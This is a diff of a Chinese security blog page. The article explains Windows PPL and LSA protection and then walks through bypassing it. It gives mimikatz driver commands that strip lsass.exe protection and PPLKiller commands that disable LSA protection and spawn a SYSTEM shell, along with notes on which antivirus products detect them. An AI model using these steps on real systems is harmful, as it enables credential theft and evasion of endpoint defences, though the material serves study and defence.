@@ -50,7 +50,7 @@
 <meta property="og:image" content="http://mamor5409.github.io/posts/1e8ed701/6.png">
 <meta property="og:image" content="http://mamor5409.github.io/posts/1e8ed701/7.png">
 <meta property="article:published_time" content="2023-03-20T15:43:09.000Z">
-<meta property="article:modified_time" content="2025-04-07T09:46:46.877Z">
+<meta property="article:modified_time" content="2025-04-07T09:47:24.690Z">
 <meta property="article:author" content="Mamor">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://mamor5409.github.io/posts/1e8ed701/1.png">
@@ -261,7 +261,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-04-07 17:46:46" itemprop="dateModified" datetime="2025-04-07T17:46:46+08:00">2025-04-07</time>
+                <time title="修改时间：2025-04-07 17:47:24" itemprop="dateModified" datetime="2025-04-07T17:47:24+08:00">2025-04-07</time>
               </span>
 
           
@@ -277,7 +277,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>1.2k</span>
+              <span>1.1k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
@@ -297,32 +297,72 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h3 id="PPL"><a href="#PPL" class="headerlink" title="PPL"></a>PPL</h3><p>PPL表示<strong>Protected Process Light</strong>，但在此之前，只有Protected Processes。受保护进程的概念是随Windows Vista / Server 2008引入的，其目的不是保护你的数据或凭据。它最初的目标是保护媒体内容和符合DRM（数字版权管理）要求。Microsoft 开发了这种机制，以便你的媒体播放器可以读取蓝光光盘的同时防止你复制其内容。当时的要求是映像文件（即可执行文件）必须使用特殊的 Windows Media 证书进行数字签名。</p>
+        <h3 id="ppl">PPL</h3>
+<p>PPL表示<strong>Protected Process
+Light</strong>，但在此之前，只有Protected
+Processes。受保护进程的概念是随Windows Vista / Server
+2008引入的，其目的不是保护你的数据或凭据。它最初的目标是保护媒体内容和符合DRM（数字版权管理）要求。Microsoft
+开发了这种机制，以便你的媒体播放器可以读取蓝光光盘的同时防止你复制其内容。当时的要求是映像文件（即可执行文件）必须使用特殊的
+Windows Media 证书进行数字签名。</p>
 <p>在实践中，不受保护的进程只能使用非常有限的特权访问受保护进程：<code>PROCESS_QUERY_LIMITED_INFORMATION</code>、<code>PROCESS_SET_LIMITED_INFORMATION</code>、<code>PROCESS_TERMINATE</code>和<code>PROCESS_SUSPEND_RESUME</code>。对于一些高度敏感的过程，这个集合甚至还可以减少。</p>
-<h3 id="LSA保护-RunAsPPL"><a href="#LSA保护-RunAsPPL" class="headerlink" title="LSA保护(RunAsPPL)"></a>LSA保护(RunAsPPL)</h3><p><code>reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL /t REG_DWORD /d 1 /f</code><br>或者<br>在注册表 HKLM\SYSTEM\CurrentControlSet\Control\Lsa 下新建一个Dword32位的 RunAsPPL 将其值设置为1</p>
-<p><img src="/posts/1e8ed701/1.png" alt="img"></p>
-<p>然后重启电脑后即可生效<br>开启LSA保护后，将无法通过mimikatz直接读取密码</p>
-<p><img src="/posts/1e8ed701/2.png" alt="img"></p>
-<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><h4 id="利用mimidrv-sys"><a href="#利用mimidrv-sys" class="headerlink" title="利用mimidrv.sys"></a>利用mimidrv.sys</h4><p>一般情况下 杀掉驱动会被杀软杀掉 可考虑在无杀软或关闭杀软后使用</p>
+<h3 id="lsa保护runasppl">LSA保护(RunAsPPL)</h3>
+<p><code>reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL /t REG_DWORD /d 1 /f</code>
+或者 在注册表 HKLM下新建一个Dword32位的 RunAsPPL 将其值设置为1</p>
+<figure>
+<img src="/posts/1e8ed701/1.png" alt="img">
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
+<p>然后重启电脑后即可生效
+开启LSA保护后，将无法通过mimikatz直接读取密码</p>
+<figure>
+<img src="/posts/1e8ed701/2.png" alt="img">
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
+<h3 id="绕过">绕过</h3>
+<h4 id="利用mimidrv.sys">利用mimidrv.sys</h4>
+<p>一般情况下 杀掉驱动会被杀软杀掉 可考虑在无杀软或关闭杀软后使用</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">!+</span><br><span class="line">!processprotect /process:lsass.exe /remove</span><br></pre></td></tr></table></figure>
-<p><img src="/posts/1e8ed701/3.png" alt="img"></p>
+<figure>
+<img src="/posts/1e8ed701/3.png" alt="img">
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
 <p>但是在另一台机器上测试时则报错 无法绕过lsa 去dump</p>
-<p>ERROR kull_m_kernel_ioctl ; CreateFile (0x00000002)「原因是驱动并没有实际加载，当时估计被杀软杀了 。。<a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz/issues/221」">https://github.com/gentilkiwi/mimikatz/issues/221」</a></p>
-<p><img src="/posts/1e8ed701/4.png" alt="img"></p>
-<h4 id="PPLKiller"><a href="#PPLKiller" class="headerlink" title="PPLKiller"></a>PPLKiller</h4><p>PPLKiller 火绒上不会有任何反应</p>
+<p>ERROR kull_m_kernel_ioctl ; CreateFile
+(0x00000002)「原因是驱动并没有实际加载，当时估计被杀软杀了
+。。https://github.com/gentilkiwi/mimikatz/issues/221」</p>
+<figure>
+<img src="/posts/1e8ed701/4.png" alt="img">
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
+<h4 id="pplkiller">PPLKiller</h4>
+<p>PPLKiller 火绒上不会有任何反应</p>
 <p>360会杀「第一次测时候编译完静态还可过 后面直接报毒」</p>
-<p>但是在起一个system权限的cmd时 360会进行拦截 估计是用createprocess api去起的一个高权限cmd</p>
+<p>但是在起一个system权限的cmd时 360会进行拦截 估计是用createprocess
+api去起的一个高权限cmd</p>
 <p>正常情况下 lsass.exe 是有保护的</p>
-<p><img src="/posts/1e8ed701/5.png" alt="img"></p>
-<p><img src="/posts/1e8ed701/8.png" alt="img"></p>
+<figure>
+<img src="/posts/1e8ed701/5.png" alt="img">
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
+<figure>
+<img src="/posts/1e8ed701/8.png" alt="img">
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
 <p>无法直接dump hash</p>
 <p>利用PPLKiller</p>
 <p><code>PPLKiller.exe /installDriver</code> 安装驱动</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PPLKiller.exe /disableLSAProtection</span><br></pre></td></tr></table></figure>
-<p><img src="/posts/1e8ed701/6.png" alt="img"></p>
+<figure>
+<img src="/posts/1e8ed701/6.png" alt="img">
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
 <p><code>PPLKiller.exe /makeSYSTEMcmd</code> 起一个system cmd</p>
-<p><img src="/posts/1e8ed701/7.png" alt="img"></p>
-<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p> <a target="_blank" rel="noopener" href="https://tttang.com/archive/1743/">https://tttang.com/archive/1743/</a></p>
+<figure>
+<img src="/posts/1e8ed701/7.png" alt="img">
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
+<h3 id="references">References</h3>
+<p>https://tttang.com/archive/1743/</p>
 
     </div>
 
@@ -448,7 +488,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#PPL"><span class="nav-number">1.</span> <span class="nav-text">PPL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#LSA%E4%BF%9D%E6%8A%A4-RunAsPPL"><span class="nav-number">2.</span> <span class="nav-text">LSA保护(RunAsPPL)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87"><span class="nav-number">3.</span> <span class="nav-text">绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8mimidrv-sys"><span class="nav-number">3.1.</span> <span class="nav-text">利用mimidrv.sys</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PPLKiller"><span class="nav-number">3.2.</span> <span class="nav-text">PPLKiller</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#References"><span class="nav-number">4.</span> <span class="nav-text">References</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#ppl"><span class="nav-number">1.</span> <span class="nav-text">PPL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#lsa%E4%BF%9D%E6%8A%A4runasppl"><span class="nav-number">2.</span> <span class="nav-text">LSA保护(RunAsPPL)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87"><span class="nav-number">3.</span> <span class="nav-text">绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8mimidrv.sys"><span class="nav-number">3.1.</span> <span class="nav-text">利用mimidrv.sys</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#pplkiller"><span class="nav-number">3.2.</span> <span class="nav-text">PPLKiller</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#references"><span class="nav-number">4.</span> <span class="nav-text">References</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -464,20 +504,20 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">198</span>
+          <span class="site-state-item-count">201</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">53</span>
+        <span class="site-state-item-count">54</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">54</span>
+        <span class="site-state-item-count">55</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -526,7 +566,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">19:31</span>
+    <span title="站点阅读时长">19:51</span>
 </div>
 
 <!--
@@ -537,7 +577,7 @@
 <!--
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共277.8k字</span>
+  <span class="post-count">博客全站共281.3k字</span>
 </div>
 -->
         
